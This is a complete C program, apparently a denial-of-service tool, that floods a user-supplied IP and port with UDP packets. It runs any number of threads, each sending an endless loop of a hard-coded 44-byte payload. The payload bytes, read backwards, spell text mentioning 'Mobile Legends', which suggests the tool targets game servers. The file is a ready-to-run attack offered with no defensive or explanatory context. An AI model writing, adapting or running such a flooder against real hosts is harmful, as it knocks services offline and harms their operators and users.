#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <windows.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <arpa/inet.h>
    #include <pthread.h>
    #include <unistd.h>
#endif

#define PAYLOAD_SIZE 44

char *ip;
int port, threads;

#ifdef _WIN32
DWORD WINAPI run() {
#else
void *run() {
#endif
    unsigned char data[] = {
        0x01, 0x71, 0xe9, 0xa8, 0x0e, 0xc2, 0x49, 0x8d,
        0x4d, 0x7c, 0x33, 0x0e, 0xf0, 0x08, 0x2e, 0x61,
        0x62, 0x6f, 0x6d, 0x20, 0x54, 0x53, 0x45, 0x62,
        0x20, 0x45, 0x48, 0x74, 0x2e, 0x53, 0x44, 0x4e,
        0x45, 0x47, 0x45, 0x6c, 0x20, 0x45, 0x4c, 0x49,
        0x42, 0x4f, 0x6d, 0x01
    };

    struct sockaddr_in server_addr;
    int sock;

#ifdef _WIN32
    // Initialize Winsock
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif

    // Setup socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);

    // Infinite loop to send packets
    while (1) {
        // Send Packet 8 times at once
        for (int i = 0; i < 8; i++) {
            sendto(sock, data, sizeof(data), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        }
    }

#ifdef _WIN32
    closesocket(sock);
    WSACleanup();
#else
    close(sock);
#endif

    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <THREADS>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    threads = atoi(argv[3]);

#ifdef _WIN32
    HANDLE *thread_ids = malloc(threads * sizeof(HANDLE));
#else
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
#endif

    // Create threads
    for (int i = 0; i < threads; i++) {
#ifdef _WIN32
        thread_ids[i] = CreateThread(NULL, 0, run, NULL, 0, NULL);
        if (thread_ids[i] == NULL) {
            perror("Failed to create thread");
            exit(EXIT_FAILURE);
        }
#else
        if (pthread_create(&thread_ids[i], NULL, run, NULL) != 0) {
            perror("Failed to create thread");
            exit(EXIT_FAILURE);
        }
#endif
    }

    // Wait for threads to finish (they won't, as this is an infinite loop)
    for (int i = 0; i < threads; i++) {
#ifdef _WIN32
        WaitForSingleObject(thread_ids[i], INFINITE);
#else
        pthread_join(thread_ids[i], NULL);
#endif
    }

    free(thread_ids);
    return 0;
}
